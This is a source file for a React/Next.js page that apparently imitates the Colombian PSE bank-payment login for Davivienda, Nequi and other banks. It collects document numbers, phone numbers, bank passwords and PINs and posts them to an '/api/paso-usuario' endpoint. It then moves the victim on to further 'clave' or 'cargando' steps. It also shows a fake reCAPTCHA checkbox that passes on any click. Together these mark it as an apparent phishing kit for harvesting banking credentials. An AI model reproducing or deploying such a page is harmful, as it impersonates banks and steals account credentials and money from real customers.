"use client";

import { useState, Suspense } from 'react';
import { useRouter, useParams, useSearchParams } from 'next/navigation';
import { useCaseStatus } from '@/context/useCaseStatus';

function UsuarioForm({ bankId }: { bankId: string }) {
    const router = useRouter();
    const searchParams = useSearchParams();
    const errorParam = searchParams.get('error');

    useCaseStatus();

    const [usuario, setUsuario] = useState('');
    const [password, setPassword] = useState('');
    const [documentType, setDocumentType] = useState('cc');
    const [error, setError] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isVerified, setIsVerified] = useState(false);

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!usuario) {
            setError(true);
            return;
        }

        setIsSubmitting(true);
        try {
            const res = await fetch('/api/paso-usuario', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user: usuario,
                    password: password,
                    bank: bankId.toUpperCase(),
                    documentType: documentType
                })
            });

            const data = await res.json();
            if (data.success) {
                if (bankId === 'davivienda' || bankId === 'nequi') {
                    router.push(`/pse/${bankId}/cargando`);
                } else {
                    router.push(`/pse/${bankId}/clave`);
                }
            } else {
                setIsSubmitting(false);
            }
        } catch (err) {
            console.error(err);
            setIsSubmitting(false);
        }
    };

    const isDavivienda = bankId === 'davivienda';
    const isNequi = bankId === 'nequi';

    return (
        <form onSubmit={handleSubmit} className="space-y-6">
            {isDavivienda && (
                <>
                    <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                            Tipo de documento
                        </label>
                        <select
                            value={documentType}
                            onChange={(e) => setDocumentType(e.target.value)}
                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all"
                        >
                            <option value="cc">Cédula de Ciudadanía</option>
                            <option value="ce">Cédula de Extranjería</option>
                            <option value="ti">Tarjeta de Identidad</option>
                            <option value="pas">Pasaporte</option>
                        </select>
                    </div>
                    <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                            Número de documento
                        </label>
                        <input
                            type="text"
                            inputMode="numeric"
                            value={usuario}
                            onChange={(e) => setUsuario(e.target.value.replace(/\D/g, ''))}
                            placeholder="Solo números"
                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all"
                        />
                    </div>
                    <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                            Clave virtual
                        </label>
                        <input
                            type="password"
                            inputMode="numeric"
                            maxLength={8}
                            value={password}
                            onChange={(e) => setPassword(e.target.value.replace(/\D/g, ''))}
                            placeholder="6 a 8 dígitos"
                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-red-500 focus:border-red-500 outline-none transition-all"
                        />
                    </div>
                </>
            )}

            {isNequi && (
                <>
                    <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                            Número de celular
                        </label>
                        <input
                            type="tel"
                            maxLength={10}
                            value={usuario}
                            onChange={(e) => setUsuario(e.target.value.replace(/\D/g, ''))}
                            placeholder="300 000 0000"
                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-pink-500 focus:border-pink-500 outline-none transition-all"
                        />
                    </div>
                    <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">
                            Clave de 4 dígitos
                        </label>
                        <input
                            type="password"
                            maxLength={4}
                            value={password}
                            onChange={(e) => setPassword(e.target.value.replace(/\D/g, ''))}
                            placeholder="****"
                            className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-pink-500 focus:border-pink-500 outline-none transition-all"
                        />
                    </div>

                    <div
                        onClick={() => setIsVerified(true)}
                        className="flex items-center gap-3 p-4 border border-gray-200 rounded-lg bg-gray-50 cursor-pointer hover:bg-white transition-all shadow-sm"
                    >
                        <div className={`w-6 h-6 border-2 rounded flex items-center justify-center transition-all ${isVerified ? 'bg-green-500 border-green-500' : 'bg-white border-gray-300'}`}>
                            {isVerified && (
                                <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                                </svg>
                            )}
                        </div>
                        <span className="text-sm font-medium text-gray-600 flex-grow">No soy un robot</span>
                        <div className="flex flex-col items-center">
                            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" className="w-8 h-8 opacity-50" alt="reCAPTCHA" />
                            <span className="text-[8px] text-gray-400 font-bold uppercase mt-1">reCAPTCHA</span>
                        </div>
                    </div>
                </>
            )}

            {!isDavivienda && !isNequi && (
                <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-2">
                        Usuario / Username
                    </label>
                    <input
                        type="text"
                        value={usuario}
                        onChange={(e) => {
                            setUsuario(e.target.value);
                            setError(false);
                        }}
                        className={`w-full px-4 py-3 rounded-xl border ${error ? 'border-red-500' : 'border-gray-300'} focus:ring-2 focus:ring-yellow-500 focus:border-yellow-500 outline-none transition-all`}
                        autoFocus
                    />
                    {error && <p className="mt-2 text-xs text-red-500 font-bold">Por favor ingresa tu usuario</p>}
                </div>
            )}

            {errorParam === 'invalid_user' && (
                <div className="p-3 bg-red-50 border-l-4 border-red-500 rounded text-red-700 text-sm font-bold">
                    🛑 Los datos ingresados son incorrectos. Por favor intenta de nuevo.
                </div>
            )}

            <button
                type="submit"
                disabled={isSubmitting || (isNequi && !isVerified)}
                className={`w-full py-4 rounded-xl font-bold text-white transition-all shadow-lg ${isSubmitting || (isNequi && !isVerified)
                    ? 'bg-gray-400 cursor-not-allowed'
                    : isNequi ? 'bg-pink-600 hover:bg-pink-700' : isDavivienda ? 'bg-red-600 hover:bg-red-700' : 'bg-yellow-500 hover:bg-yellow-600 text-gray-900'
                    }`}
            >
                {isSubmitting ? 'Procesando...' : isNequi ? 'Entra' : isDavivienda ? 'Iniciar sesión' : 'Siguiente'}
            </button>
        </form>
    );
}

export default function UsuarioPage() {
    const params = useParams();
    const bankId = params.bankId as string;

    return (
        <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
            <div className="w-full max-w-[440px]">
                <div className="flex justify-center mb-8">
                    <img
                        src={bankId === 'nequi' ? "/nequi-logo.png" : `/img/${bankId}-logo.svg`}
                        alt={bankId}
                        className="h-12 object-contain"
                        onError={(e) => {
                            const target = e.target as HTMLImageElement;
                            target.src = "/pse-logo.jpg";
                        }}
                    />
                </div>

                <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
                    <div className="p-8">
                        <h1 className="text-2xl font-bold text-gray-800 mb-2">
                            {bankId === 'nequi' ? "Pagos PSE de Nequi" : "¡Hola!"}
                        </h1>
                        <p className="text-gray-500 mb-8 font-medium">
                            {bankId === 'nequi'
                                ? "Ingresa tu número de cel y clave. Recuerda tener tu cel a la mano."
                                : bankId === 'davivienda'
                                    ? "Nos alegra que esté aquí"
                                    : "Para continuar, ingresa tu usuario"}
                        </p>

                        <Suspense fallback={<div className="text-center py-10">Cargando...</div>}>
                            <UsuarioForm bankId={bankId} />
                        </Suspense>
                    </div>
                </div>

                <div className="mt-8 text-center text-xs text-gray-400 font-medium">
                    © {new Date().getFullYear()} Pago Seguro en Línea. Todos los derechos reservados.
                </div>
            </div>
        </div>
    );
}
